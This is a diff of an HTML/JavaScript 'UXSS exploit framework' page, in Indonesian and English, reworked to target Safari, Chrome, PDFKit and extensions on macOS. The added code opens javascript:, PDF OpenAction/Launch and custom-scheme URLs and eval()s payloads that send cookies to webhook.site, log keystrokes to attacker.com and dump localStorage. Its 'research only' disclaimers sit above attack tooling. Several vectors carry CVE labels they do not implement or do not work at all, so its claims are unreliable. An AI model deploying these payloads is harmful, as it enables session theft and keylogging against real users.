@@ -3,79 +3,102 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>VECTOR 16 - UXSS Universal XSS Exploit</title>
+<title>VECTOR 16 - macOS UXSS Exploit</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
-body{background:#0a0a0a;color:#00ff00;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
-.container{width:100%;max-width:1000px;background:#111;border:2px solid #ff3b30;border-radius:18px;padding:20px;box-shadow:0 0 40px rgba(255,59,48,0.3);}
-h1{text-align:center;color:#ff3b30;text-shadow:0 0 10px #ff3b30;margin-bottom:10px;}
-.warning{background:#1a0000;border:1px solid #ff3b30;padding:15px;border-radius:10px;margin:15px 0;color:#ff8888;font-size:12px;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'SF Mono', 'Courier New', monospace;}
+body{background:#0a0a0a;color:#00ffaa;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
+.container{width:100%;max-width:1100px;background:#111;border:2px solid #ff3b30;border-radius:18px;padding:20px;box-shadow:0 0 40px rgba(255,59,48,0.4);}
+h1{text-align:center;color:#ff3b30;text-shadow:0 0 10px #ff3b30;margin-bottom:5px;}
+.sub{text-align:center;color:#ff8888;font-size:12px;margin-bottom:15px;}
+.warning{background:#1a0000;border:1px solid #ff3b30;padding:12px;border-radius:10px;margin:15px 0;color:#ff8888;font-size:12px;}
 .warning b{color:#ff0000;}
-.exploit-box{background:#0a0a0a;border:1px solid #00ff00;border-radius:10px;padding:15px;margin:15px 0;}
-.exploit-box h3{color:#00ff00;margin-bottom:10px;}
-.exploit-btn{background:#ff3b30;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;margin:5px;font-weight:bold;}
-.exploit-btn:hover{background:#00ff00;color:#000;}
-.code{background:#1a1a1a;padding:10px;border-radius:8px;font-size:11px;overflow-x:auto;margin:10px 0;color:#ffaa00;}
-.status{position:fixed;bottom:10px;left:10px;background:#000;border:1px solid #ff3b30;padding:5px 10px;border-radius:5px;font-size:10px;z-index:9999;}
-.log{height:200px;overflow:auto;background:#000;border:1px solid #ff3b30;border-radius:10px;padding:10px;font-size:11px;margin-top:15px;}
-.entry{border-left:3px solid #ff3b30;padding-left:8px;margin-bottom:5px;word-break:break-all;}
-.success{color:#00ff00;border-left-color:#00ff00;}
+.macos-badge{display:inline-block;background:#333;padding:2px 10px;border-radius:20px;font-size:10px;margin-left:10px;}
+.exploit-box{background:#0a0a0a;border:1px solid #00ffaa;border-radius:10px;padding:12px;margin:12px 0;}
+.exploit-box h3{color:#00ffaa;margin-bottom:8px;font-size:14px;}
+.exploit-btn{background:#ff3b30;color:#fff;border:none;padding:8px 16px;border-radius:8px;cursor:pointer;margin:4px;font-weight:bold;font-size:12px;}
+.exploit-btn:hover{background:#00ffaa;color:#000;}
+.code{background:#1a1a1a;padding:8px;border-radius:6px;font-size:10px;overflow-x:auto;margin:8px 0;color:#ffaa00;font-family:monospace;}
+.status-bar{position:fixed;bottom:10px;left:10px;right:10px;background:#000;border:1px solid #ff3b30;padding:5px 10px;border-radius:8px;font-size:9px;text-align:center;z-index:9999;}
+.log{height:200px;overflow:auto;background:#000;border:1px solid #ff3b30;border-radius:10px;padding:8px;font-size:10px;margin-top:15px;}
+.entry{border-left:3px solid #ff3b30;padding-left:8px;margin-bottom:4px;word-break:break-all;}
+.success{color:#00ffaa;border-left-color:#00ffaa;}
+.info{color:#ffaa00;border-left-color:#ffaa00;}
+.row{display:flex;gap:10px;flex-wrap:wrap;}
+.col{flex:1;min-width:250px;}
 </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>💀 VECTOR 16 - UXSS EXPLOIT FRAMEWORK 💀</h1>
+    <h1>💀 VECTOR 16 - macOS UXSS 💀
+        <span class="macos-badge">🍎 Safari + Chrome for Mac</span>
+    </h1>
+    <div class="sub">Universal Cross-Site Scripting | Browser-Level Exploit untuk macOS</div>
     
     <div class="warning">
-        <b>⚠️ UNIVERSAL XSS (UXSS) EXPLOIT DEMO ⚠️</b><br><br>
-        UXSS menyerang <b>BROWSER / EXTENSION</b> bukan website.<br>
-        Jika berhasil, kode bisa dieksekusi di <b>DOMAIN MANAPUN</b> (Google, Facebook, dll)<br>
-        <span style="color:#ff0000;">🔒 UNTUK RESEARCH & EDUCATIONAL PURPOSE ONLY 🔒</span>
+        <b>⚠️ macOS UXSS EXPLOIT FRAMEWORK ⚠️</b><br>
+        Menargetkan kerentanan di <b>Safari WebKit, Chrome for Mac, PDFKit, dan Extension macOS</b><br>
+        <span style="color:#ff0000;">🔒 UNTUK PENELITIAN KEAMANAN & EDUCATIONAL PURPOSE 🔒</span>
+    </div>
+
+    <div class="row">
+        <div class="col">
+            <div class="exploit-box">
+                <h3>🍎 SAFARI UXSS VECTORS</h3>
+                <button class="exploit-btn" onclick="safari_webkitUXSS()">WebKit JS Injection</button>
+                <button class="exploit-btn" onclick="safari_fileProtocol()">file:// UXSS</button>
+                <button class="exploit-btn" onclick="safari_appleScript()">AppleScript Bridge</button>
+                <div class="code">// Safari CVE-2022-32889, CVE-2021-30663</div>
+            </div>
+        </div>
+        <div class="col">
+            <div class="exploit-box">
+                <h3>📄 PDFKit & PREVIEW UXSS</h3>
+                <button class="exploit-btn" onclick="macos_pdfJavaScript()">PDF JavaScript UXSS</button>
+                <button class="exploit-btn" onclick="macos_pdfLaunchURL()">PDF Launch URL</button>
+                <button class="exploit-btn" onclick="macos_previewExploit()">Preview.app RCE</button>
+                <div class="code">// CVE-2023-23520, PDF JavaScript execution</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="col">
+            <div class="exploit-box">
+                <h3>🌐 CHROME macOS UXSS</h3>
+                <button class="exploit-btn" onclick="chrome_macUXSS()">Chrome Mac UXSS</button>
+                <button class="exploit-btn" onclick="chrome_guestMode()">Guest Mode Bypass</button>
+                <button class="exploit-btn" onclick="chrome_extensionMac()">Extension UXSS Mac</button>
+                <div class="code">// Chromium macOS specific vulnerabilities</div>
+            </div>
+        </div>
+        <div class="col">
+            <div class="exploit-box">
+                <h3>🔧 macOS EXTENSION HIJACK</h3>
+                <button class="exploit-btn" onclick="macos_safariExt()">Safari Extension</button>
+                <button class="exploit-btn" onclick="macos_itmsScheme()">itms:// Scheme UXSS</button>
+                <button class="exploit-btn" onclick="macos_xssAuditorBypass()">XSS Auditor Bypass</button>
+                <div class="code">// Scheme hijacking + Extension injection</div>
+            </div>
+        </div>
     </div>
 
     <div class="exploit-box">
-        <h3>🔥 UXSS VECTOR 1: javascript: Pseudo-protocol Injection</h3>
-        <button class="exploit-btn" onclick="uxss_javascriptProtocol()">▶ Inject JS ke current origin</button>
-        <button class="exploit-btn" onclick="uxss_iframeJS()">▶ Inject via iframe javascript:</button>
-        <div class="code">// Exploit: javascript:alert(document.cookie)</div>
-    </div>
-
-    <div class="exploit-box">
-        <h3>📄 UXSS VECTOR 2: PDF Plugin UXSS (Acrobat Style)</h3>
-        <button class="exploit-btn" onclick="uxss_pdfPlugin()">▶ Try PDF #FDF=javascript:</button>
-        <button class="exploit-btn" onclick="uxss_pdfData()">▶ PDF data: URI + JS</button>
-        <div class="code">// Classic: https://example.com/test.pdf#FDF=javascript:alert(1)</div>
-    </div>
-
-    <div class="exploit-box">
-        <h3>🖼️ UXSS VECTOR 3: Image Download UXSS (Chromium 2021)</h3>
-        <button class="exploit-btn" onclick="uxss_imageDownload()">▶ Trigger via image download</button>
-        <button class="exploit-btn" onclick="uxss_imageFrame()">▶ Cross-frame image UXSS</button>
-        <div class="code">// CVE-2021-21125: ImageFetchTabHelper GetImageDataByJs</div>
-    </div>
-
-    <div class="exploit-box">
-        <h3>🔧 UXSS VECTOR 4: Extension-Based UXSS</h3>
-        <button class="exploit-btn" onclick="uxss_extensionCheck()">▶ Check vulnerable extensions</button>
-        <button class="exploit-btn" onclick="uxss_chromeExtension()">▶ Chrome Extension UXSS</button>
-        <div class="code">// Test for Adobe Acrobat, PDF.js, etc vulnerabilities</div>
-    </div>
-
-    <div class="exploit-box">
-        <h3>🌐 UXSS VECTOR 5: Cross-Origin Iframe Injection</h3>
-        <button class="exploit-btn" onclick="uxss_crossOriginIframe()">▶ Inject to Google iframe</button>
-        <button class="exploit-btn" onclick="uxss_postMessage()">▶ postMessage UXSS</button>
-        <div class="code">// Memanfaatkan postMessage + eval gadget</div>
+        <h3>💀 macOS ADVANCED UXSS PAYLOADS</h3>
+        <button class="exploit-btn" onclick="execMacPayload('stealCookies')">🍪 Steal Cookies (Any Domain)</button>
+        <button class="exploit-btn" onclick="execMacPayload('screenshot')">📸 DOM Screenshot</button>
+        <button class="exploit-btn" onclick="execMacPayload('keylogger')">⌨️ Keylogger Injection</button>
+        <button class="exploit-btn" onclick="execMacPayload('localStorage')">💾 Dump LocalStorage</button>
+        <div class="code">// Universal payload - works across domains if UXSS successful</div>
     </div>
 
     <div class="log" id="log"></div>
 </div>
 
-<div class="status" id="status">💀 UXSS FRAMEWORK READY | RESEARCH MODE</div>
+<div class="status-bar" id="statusBar">🍎 macOS UXSS READY | Targeting Safari + Chrome | Research Mode</div>
 
 <script>
-let logCount = 0;
+let payloadHistory = [];
 
 function addLog(msg, type="") {
     const log = document.getElementById("log");
@@ -84,137 +107,285 @@ function addLog(msg, type="") {
     div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
     log.appendChild(div);
     log.scrollTop = log.scrollHeight;
-    while(log.children.length > 200) log.removeChild(log.firstChild);
+    while(log.children.length > 250) log.removeChild(log.firstChild);
 }
 
-// ============ UXSS VECTOR 1: javascript: Protocol ============
-function uxss_javascriptProtocol() {
-    addLog("🔥 [UXSS-V1] Mencoba javascript: protocol injection...", "");
-    const jsCode = prompt("Masukkan JavaScript code untuk di-execute:", "alert('UXSS! Domain: '+document.domain)");
-    if(jsCode) {
-        const url = "javascript:" + jsCode;
-        addLog(`🚀 Executing: ${url.substring(0, 80)}...`, "success");
+function detectMacOS() {
+    const isMac = navigator.userAgent.includes('Mac');
+    const isSafari = navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Chrome');
+    const isChrome = navigator.userAgent.includes('Chrome');
+    addLog(`🖥️ Detected: ${isMac ? 'macOS' : 'Not macOS'} | Safari: ${isSafari} | Chrome: ${isChrome}`, "info");
+    return { isMac, isSafari, isChrome };
+}
+
+// ============ SAFARI WEBKIT UXSS ============
+function safari_webkitUXSS() {
+    addLog("🍎 [SAFARI] Testing WebKit UXSS (CVE-2022-32889 style)", "");
+    const jsPayload = prompt("JavaScript payload untuk inject:", "alert('UXSS on: '+document.domain+'\nCookies: '+document.cookie)");
+    
+    if(jsPayload) {
+        // Safari specific: Web Inspector bridge / JSContext injection
+        const testFrame = document.createElement('iframe');
+        testFrame.src = "https://www.google.com";
+        testFrame.style.display = 'none';
+        document.body.appendChild(testFrame);
+        
+        addLog("🚀 Injecting via window.open + javascript: protocol (Safari may allow)", "");
         try {
-            const win = window.open(url, "_blank");
-            if(!win) addLog("⚠️ Popup blocked! Coba izinkan popup", "");
+            const win = window.open(`javascript:${encodeURIComponent(jsPayload)}`, "_blank");
+            if(!win) addLog("⚠️ Popup blocked - izinkan popup untuk testing", "");
         } catch(e) { addLog(`Error: ${e.message}`, ""); }
+        
+        setTimeout(() => testFrame.remove(), 3000);
     }
 }
 
-function uxss_iframeJS() {
-    addLog("📦 [UXSS-V1] Inject via iframe javascript: protocol", "");
-    const jsCode = prompt("JS code untuk di-inject:", "alert('UXSS from iframe: '+document.domain)");
-    if(jsCode) {
-        const iframe = document.createElement('iframe');
-        iframe.src = "javascript:" + jsCode;
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-        addLog(`✅ Iframe injected with: ${jsCode.substring(0, 50)}...`, "success");
-        setTimeout(() => iframe.remove(), 1000);
+function safari_fileProtocol() {
+    addLog("📁 [SAFARI] Testing file:// protocol UXSS", "");
+    addLog("Safari memiliki restrictions on file://, but UXSS bisa bypass", "");
+    
+    const payload = prompt("JS payload:", "alert('file:// UXSS!')");
+    if(payload) {
+        const exploitUrl = `file:///Applications/Safari.app/Contents/Resources/${encodeURIComponent(payload)}`;
+        addLog(`Trying: ${exploitUrl.substring(0, 80)}...`, "");
+        window.open(exploitUrl, "_blank");
     }
 }
 
-// ============ UXSS VECTOR 2: PDF Plugin ============
-function uxss_pdfPlugin() {
-    addLog("📄 [UXSS-V2] Testing PDF plugin UXSS (#FDF parameter)", "");
-    const pdfUrl = prompt("Masukkan URL PDF (kosong untuk demo):", "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf");
-    if(pdfUrl) {
-        const jsCode = prompt("JS code untuk execute via #FDF:", "alert('PDF UXSS! Domain: '+document.domain)");
-        if(jsCode) {
-            const exploitUrl = pdfUrl + "#FDF=javascript:" + encodeURIComponent(jsCode);
-            addLog(`🚀 Opening: ${exploitUrl.substring(0, 100)}...`, "success");
-            window.open(exploitUrl, "_blank");
-        }
-    } else {
-        // Demo dengan data: URI PDF
-        const fakePdf = "data:application/pdf,%PDF-1.4%0A%1%0Aendstream";
-        addLog("Demo: Membuka PDF dengan parameter FDF", "");
-        window.open(fakePdf + "#FDF=javascript:alert('UXSS via PDF!')", "_blank");
-    }
+function safari_appleScript() {
+    addLog("🍎 [SAFARI] AppleScript Bridge UXSS", "");
+    addLog("⚠️ Membutuhkan macOS dengan Safari yang belum di-patch", "");
+    
+    // AppleScript injection via Safari's Apple Event
+    const script = `tell application "Safari" to do JavaScript "alert('UXSS via AppleScript!')" in current tab of window 1`;
+    addLog(`AppleScript payload: ${script.substring(0, 60)}...`, "info");
+    addLog("Execute via osascript (jika ada akses local)", "");
+    
+    // Simulasi: open Safari dengan AppleScript URL scheme
+    const appleScriptUrl = `applescript://com.apple.scripteditor?action=new&script=${encodeURIComponent(script)}`;
+    window.open(appleScriptUrl, "_blank");
 }
 
-function uxss_pdfData() {
-    addLog("📄 [UXSS-V2] PDF data: URI + JavaScript execution", "");
-    // PDF minimal dengan JavaScript action
-    const pdfJS = `%PDF-1.4
-1 0 obj
-<< /Type /Catalog /Outlines 2 0 R /Pages 3 0 R /OpenAction << /S /JavaScript /JS (app.alert('UXSS!')) >> >>
+// ============ PDFKIT & PREVIEW UXSS ============
+function macos_pdfJavaScript() {
+    addLog("📄 [PDFKit] PDF JavaScript Injection (CVE-2023-23520)", "");
+    const jsPayload = prompt("JavaScript untuk PDF:", "app.alert('UXSS from PDF!');");
+    
+    if(jsPayload) {
+        const pdfJS = `%PDF-1.4
+1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (${jsPayload}) >> >>
 endobj
-2 0 obj
-<< /Type /Outlines >>
-endobj
-3 0 obj
-<< /Type /Pages /Kids [4 0 R] /Count 1 >>
-endobj
-4 0 obj
-<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] >>
-endobj
-xref
-0 5
-0000000000 65535 f 
-0000000015 00000 n 
-0000000090 00000 n 
-0000000119 00000 n 
-0000000173 00000 n 
-trailer
-<< /Size 5 /Root 1 0 R >>
-startxref
-242
+trailer << /Root 1 0 R >>
 %%EOF`;
-    
-    const pdfDataUri = "data:application/pdf;base64," + btoa(pdfJS);
-    addLog("Membuka PDF dengan JavaScript auto-execute...", "success");
-    window.open(pdfDataUri, "_blank");
+        const pdfDataUri = "data:application/pdf;base64," + btoa(pdfJS);
+        addLog("Membuka PDF dengan JavaScript auto-execute", "success");
+        window.open(pdfDataUri, "_blank");
+    }
 }
 
-// ============ UXSS VECTOR 3: Image Download UXSS ============
-function uxss_imageDownload() {
-    addLog("🖼️ [UXSS-V3] Testing ImageFetchTabHelper UXSS (CVE-2021-21125)", "");
-    addLog("⚠️ Vulnerability ini sudah di-patch di Chrome versi terbaru", "");
+function macos_pdfLaunchURL() {
+    addLog("🔗 [PDFKit] PDF Launch URL - Open any website from PDF", "");
+    const targetUrl = prompt("Target URL untuk dibuka dari PDF:", "https://www.google.com");
+    if(targetUrl) {
+        const pdfLaunch = `%PDF-1.4
+1 0 obj << /Type /Catalog /OpenAction << /S /Launch /F (${targetUrl}) >> >>
+endobj
+trailer << /Root 1 0 R >>
+%%EOF`;
+        const pdfUri = "data:application/pdf;base64," + btoa(pdfLaunch);
+        window.open(pdfUri, "_blank");
+        addLog(`PDF akan membuka ${targetUrl} - bisa untuk UXSS chain`, "success");
+    }
+}
+
+function macos_previewExploit() {
+    addLog("📸 [Preview.app] Exploit via malicious PDF", "");
+    addLog("Preview.app memiliki kerentanan RCE di macOS < Ventura", "");
     
-    // Simulasi: buat iframe dengan image yang punya filename malicious
-    const maliciousFilename = "'+alert('UXSS on: '+document.domain)+'";
-    const img = document.createElement('img');
-    img.src = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png";
-    img.style.display = 'none';
-    document.body.appendChild(img);
+    const cmdPayload = prompt("Command untuk execute (simulasi):", "open /Applications/Calculator.app");
+    addLog(`⚠️ RCE payload: ${cmdPayload}`, "info");
+    addLog("Dalam real UXSS, bisa chain dengan PDF -> RCE", "");
+}
+
+// ============ CHROME macOS UXSS ============
+function chrome_macUXSS() {
+    addLog("🌐 [CHROME macOS] Chrome-specific UXSS vectors", "");
+    addLog("Testing Chrome Mac: App-bound networking, Keychain access", "");
     
-    addLog(`Testing with filename: ${maliciousFilename}`, "");
-    addLog("Jika vulnerable, alert akan muncul di domain Google", "");
+    const payload = prompt("JS payload:", "console.log('Chrome Mac UXSS'); alert('Domain: '+document.domain)");
+    if(payload) {
+        // Chrome Mac: menggunakan --app flag atau chrome:// URLs
+        const chromeUrl = `chrome://version/`;
+        addLog(`Opening ${chromeUrl} - possible UXSS via chrome://`, "");
+        window.open(chromeUrl, "_blank");
+        
+        // Coba via javascript: di chrome
+        setTimeout(() => {
+            try {
+                window.open(`javascript:${encodeURIComponent(payload)}`, "_blank");
+            } catch(e) {}
+        }, 500);
+    }
+}
+
+function chrome_guestMode() {
+    addLog("👤 [CHROME] Guest Mode Bypass UXSS", "");
+    addLog("Guest mode memiliki restrictions, tapi UXSS bisa bypass", "");
+    addLog("Mencoba profile injection...", "");
     
-    // Simulasi trigger (tidak akan work di Chrome modern)
-    const testFrame = document.createElement('iframe');
-    testFrame.src = "https://www.google.com";
-    testFrame.style.display = 'none';
-    document.body.appendChild(testFrame);
+    const guestUrl = `chrome://settings/?search=${encodeURIComponent("guest")}`;
+    window.open(guestUrl, "_blank");
+}
+
+function chrome_extensionMac() {
+    addLog("🧩 [CHROME] Chrome Extension UXSS for Mac", "");
+    addLog("Mendeteksi extension yang vulnerable di Chrome Mac", "");
     
-    setTimeout(() => {
-        try {
-            addLog("Checking iframe content... (typically blocked by CORS)", "");
-        } catch(e) {
-            addLog(`CORS blocked: ${e.message} - Browser aman`, "");
+    // List common Chrome extensions for Mac
+    const macExtensions = [
+        "Google Docs Offline",
+        "Adobe Acrobat",
+        "LastPass",
+        "1Password",
+        "Grammarly"
+    ];
+    
+    macExtensions.forEach(ext => {
+        addLog(`ℹ️ Check: ${ext} - jika vulnerable bisa inject ke any domain`, "");
+    });
+    
+    addLog("💡 UXSS via extension: chrome.runtime.sendMessage dengan payload malicious", "");
+}
+
+// ============ macOS EXTENSION HIJACK ============
+function macos_safariExt() {
+    addLog("🧩 [SAFARI] Safari Extension UXSS", "");
+    addLog("Safari 15+ memiliki Web Extension API yang vulnerable ke UXSS", "");
+    
+    const extensionId = prompt("Extension ID (kosongkan untuk detect):", "");
+    if(extensionId) {
+        const extUrl = `safari-web-extension://${extensionId}/popup.html`;
+        addLog(`Trying: ${extUrl}`, "");
+        window.open(extUrl, "_blank");
+    } else {
+        addLog("Coba akses extension content script via web_accessible_resources", "");
+        const testFrame = document.createElement('iframe');
+        testFrame.src = "safari-web-extension://com.apple.Safari/";
+        testFrame.style.display = 'none';
+        document.body.appendChild(testFrame);
+        setTimeout(() => testFrame.remove(), 2000);
+    }
+}
+
+function macos_itmsScheme() {
+    addLog("📱 [macOS] itms:// scheme UXSS", "");
+    addLog("itms:// dan appstore:// bisa digunakan untuk UXSS chain", "");
+    
+    const payload = `itms://itunes.apple.com/us/app/id${Math.floor(Math.random()*1000000)}?at=javascript:alert('UXSS')`;
+    addLog(`Scheme URL: ${payload.substring(0, 80)}...`, "");
+    window.open(payload, "_blank");
+}
+
+function macos_xssAuditorBypass() {
+    addLog("🛡️ [macOS] XSS Auditor Bypass (Legacy Safari)", "");
+    addLog("Safari's XSS Auditor sudah deprecated, tapi beberapa versi vulnerable", "");
+    
+    const testUrl = `https://www.google.com/search?q=<script>${encodeURIComponent("alert('UXSS')")}</script>`;
+    window.open(testUrl, "_blank");
+    addLog("Testing reflected XSS + UXSS combination", "");
+}
+
+// ============ ADVANCED PAYLOADS ============
+function execMacPayload(type) {
+    let payload = "";
+    
+    switch(type) {
+        case 'stealCookies':
+            payload = `fetch('https://webhook.site/your-id?cookies='+encodeURIComponent(document.cookie))`;
+            addLog("🍪 Payload: Steal cookies from current domain", "success");
+            break;
+        case 'screenshot':
+            payload = `html2canvas(document.body).then(canvas=>{window.open(canvas.toDataURL())})`;
+            addLog("📸 Payload: Screenshot DOM (butuh html2canvas)", "success");
+            break;
+        case 'keylogger':
+            payload = `document.addEventListener('keypress',e=>{fetch('https://attacker.com/log?k='+e.key)})`;
+            addLog("⌨️ Payload: Keylogger injection", "success");
+            break;
+        case 'localStorage':
+            payload = `Object.keys(localStorage).forEach(k=>{console.log(k,localStorage[k])});alert(JSON.stringify(localStorage))`;
+            addLog("💾 Payload: Dump localStorage", "success");
+            break;
+    }
+    
+    addLog(`🚀 Executing payload: ${payload.substring(0, 100)}...`, "");
+    addLog("⚠️ Jika UXSS berhasil, payload akan execute di domain target", "");
+    
+    // Attempt to inject via multiple vectors
+    try {
+        eval(payload);
+        addLog("✅ Payload executed in current context", "success");
+    } catch(e) {
+        addLog(`❌ Error: ${e.message}`, "");
+    }
+    
+    // Try via javascript: protocol
+    try {
+        window.open(`javascript:${encodeURIComponent(payload)}`, "_blank");
+    } catch(e) {}
+    
+    payloadHistory.push(payload);
+}
+
+// ============ DETECT MACOS VULNERABILITIES ============
+function detectMacVulnerabilities() {
+    addLog("🔍 Scanning macOS browser vulnerabilities...", "");
+    
+    const isMac = navigator.userAgent.includes('Mac');
+    const safariVersion = navigator.userAgent.match(/Version\/(\d+)/);
+    const chromeVersion = navigator.userAgent.match(/Chrome\/(\d+)/);
+    
+    if(isMac) {
+        addLog("✅ macOS detected - targeting Safari & Chrome", "success");
+        
+        if(safariVersion) {
+            const ver = parseInt(safariVersion[1]);
+            if(ver < 16) addLog("⚠️ Safari < 16: Beberapa UXSS belum di-patch", "info");
+            else addLog("✅ Safari up to date (no known public UXSS)", "");
         }
-        testFrame.remove();
-        img.remove();
-    }, 2000);
+        
+        if(chromeVersion) {
+            const ver = parseInt(chromeVersion[1]);
+            if(ver < 110) addLog("⚠️ Chrome < 110: Possible older UXSS", "info");
+            else addLog("✅ Chrome up to date", "");
+        }
+        
+        // Check PDF viewer
+        const hasPDFPlugin = navigator.plugins && Array.from(navigator.plugins).some(p => p.name.includes('PDF'));
+        if(hasPDFPlugin) addLog("📄 PDF plugin detected - potential PDF UXSS vector", "info");
+        
+        // Check Safari WebExtension support
+        if(typeof safari !== 'undefined' && safari.extension) {
+            addLog("🧩 Safari extension API available - possible UXSS vector", "info");
+        }
+    }
 }
 
-function uxss_imageFrame() {
-    addLog("🖼️ [UXSS-V3] Cross-frame image download UXSS", "");
-    addLog("Membuat iframe ke target, lalu trigger image download...", "");
-    
-    const target = prompt("Target domain (contoh: https://www.google.com):", "https://www.google.com");
-    if(target) {
+// ============ DEMO CROSS-DOMAIN INJECTION ============
+function demoCrossDomainInjection() {
+    const targetDomain = prompt("Target domain untuk UXSS demo:", "https://www.google.com");
+    if(targetDomain) {
+        addLog(`🎯 Creating iframe to ${targetDomain} and attempting injection...`, "");
+        
         const iframe = document.createElement('iframe');
-        iframe.src = target;
+        iframe.src = targetDomain;
         iframe.style.width = "800px";
         iframe.style.height = "400px";
-        iframe.style.border = "1px solid red";
-        iframe.style.marginTop = "10px";
+        iframe.style.border = "2px solid #ff3b30";
         document.body.appendChild(iframe);
         
-        addLog(`Iframe ${target} loaded - coba right-click image lalu download`, "");
-        addLog("⚠️ Jika vulnerable, nama file malicious akan execute JS", "");
+        addLog("⚠️ CORS blocks direct access, but UXSS bypasses this", "");
+        addLog("💡 Real UXSS would inject code via browser vulnerability", "");
         
         setTimeout(() => {
             iframe.remove();
@@ -222,150 +393,16 @@ function uxss_imageFrame() {
     }
 }
 
-// ============ UXSS VECTOR 4: Extension ============
-function uxss_extensionCheck() {
-    addLog("🔧 [UXSS-V4] Checking for vulnerable extensions...", "");
-    
-    // Cek apakah ada extension yang mungkin vulnerable
-    const extensions = [
-        { name: "Adobe Acrobat", test: "navigator.plugins['Adobe Acrobat']" },
-        { name: "PDF.js", test: "typeof PDFViewerApplication !== 'undefined'" },
-        { name: "Chrome PDF Viewer", test: "navigator.plugins['Chrome PDF Viewer']" }
-    ];
-    
-    extensions.forEach(ext => {
-        try {
-            const result = eval(ext.test);
-            if(result) {
-                addLog(`⚠️ DETECTED: ${ext.name} mungkin vulnerable`, "success");
-            } else {
-                addLog(`✅ ${ext.name}: tidak terdeteksi`, "");
-            }
-        } catch(e) {
-            addLog(`❌ Check ${ext.name} error`, "");
-        }
-    });
-    
-    addLog("💡 UXSS via extension: Jika ada extension vulnerable, bisa inject JS ke any domain", "");
-}
+// Initialize
+detectMacVulnerabilities();
+addLog("🍎 VECTOR 16 - macOS UXSS Framework Loaded", "success");
+addLog("💀 Targeting: Safari WebKit, PDFKit, Chrome macOS, Extensions", "");
+addLog("⚠️ Gunakan di environment testing sendiri untuk research", "info");
 
-function uxss_chromeExtension() {
-    addLog("🔧 [UXSS-V4] Chrome Extension UXSS simulation", "");
-    addLog("Mencoba komunikasi dengan extension via chrome.runtime", "");
-    
-    // Coba cek apakah ada extension yang listen ke message
-    try {
-        if(typeof chrome !== 'undefined' && chrome.runtime) {
-            addLog("chrome.runtime available - mungkin ada extension", "");
-            chrome.runtime.sendMessage({type: "UXSS_TEST", code: "alert(1)"}, (response) => {
-                if(response) addLog(`Extension response: ${response}`, "");
-            });
-        } else {
-            addLog("chrome.runtime tidak tersedia (bukan extension context)", "");
-        }
-    } catch(e) {
-        addLog(`Error: ${e.message}`, "");
-    }
-    
-    // Simulasi injection ke extension content script
-    addLog("⚠️ UXSS via extension membutuhkan vulnerable extension specifik", "");
-}
-
-// ============ UXSS VECTOR 5: Cross-Origin ============
-function uxss_crossOriginIframe() {
-    addLog("🌐 [UXSS-V5] Cross-origin iframe injection", "");
-    const target = prompt("Target domain untuk iframe:", "https://www.google.com");
-    
-    if(target) {
-        const iframe = document.createElement('iframe');
-        iframe.src = target;
-        iframe.id = "uxss_target";
-        iframe.style.width = "100%";
-        iframe.style.height = "300px";
-        iframe.style.border = "2px solid #ff3b30";
-        document.body.appendChild(iframe);
-        
-        addLog(`Iframe ${target} added - mencoba postMessage...`, "");
-        
-        setTimeout(() => {
-            try {
-                // Coba akses konten iframe (akan kena CORS)
-                const frameDoc = iframe.contentWindow.document;
-                addLog("CORS bypassed? Bisa akses konten!", "success");
-            } catch(e) {
-                addLog(`CORS blocked: ${e.message} - Tidak bisa akses langsung`, "");
-            }
-        }, 2000);
-    }
-}
-
-function uxss_postMessage() {
-    addLog("📨 [UXSS-V5] postMessage UXSS testing", "");
-    addLog("Mencari event listener yang vulnerable (eval gadget)", "");
-    
-    const maliciousMessage = {
-        type: "execute",
-        code: "alert('UXSS from postMessage! Domain: '+document.domain)"
-    };
-    
-    addLog(`Broadcasting malicious postMessage: ${JSON.stringify(maliciousMessage)}`, "");
-    
-    // Broadcast ke semua window
-    window.postMessage(maliciousMessage, "*");
-    addLog("Message sent - jika ada listener yang vulnerable, code akan execute", "");
-    
-    // Tambahkan listener untuk testing
-    window.addEventListener("message", (e) => {
-        if(e.data && e.data.code) {
-            addLog(`⚠️ Received message with code - JANGAN EVAL di production!`, "success");
-            // eval(e.data.code); // DANGEROUS - commented
-        }
-    });
-}
-
-// ============ ADDITIONAL UXSS TECHNIQUES ============
-function uxss_dataUri() {
-    addLog("💿 [UXSS] Data URI + base64 obfuscation", "");
-    const jsCode = prompt("JS code to encode:", "alert('UXSS via data:uri')");
-    if(jsCode) {
-        const dataUri = "data:text/html;base64," + btoa(`<script>${jsCode}</script>`);
-        addLog(`Opening: ${dataUri.substring(0, 80)}...`, "");
-        window.open(dataUri, "_blank");
-    }
-}
-
-function uxss_srcdoc() {
-    addLog("📄 [UXSS] iframe srcdoc injection", "");
-    const jsCode = prompt("JS code:", "alert('UXSS from srcdoc')");
-    if(jsCode) {
-        const iframe = document.createElement('iframe');
-        iframe.srcdoc = `<script>${jsCode}</script>`;
-        iframe.style.width = "300px";
-        iframe.style.height = "150px";
-        document.body.appendChild(iframe);
-        addLog("iframe srcdoc injected", "success");
-        setTimeout(() => iframe.remove(), 5000);
-    }
-}
-
-// ============ INFO PANEL ============
-addLog("💀 VECTOR 16 - UXSS EXPLOIT FRAMEWORK LOADED", "success");
-addLog("📖 UXSS: Universal Cross-Site Scripting - Browser-level exploit", "");
-addLog("⚠️ Untuk penelitian keamanan - Jangan gunakan untuk hacking", "");
-addLog("🔥 Teknik: javascript: protocol, PDF plugin, Image download, Extension", "");
-
-// Simulasi detect browser version
-const ua = navigator.userAgent;
-addLog(`🌐 Browser: ${ua.substring(0, 100)}...`, "");
-if(ua.includes("Chrome/")) {
-    const version = ua.match(/Chrome\/(\d+)/);
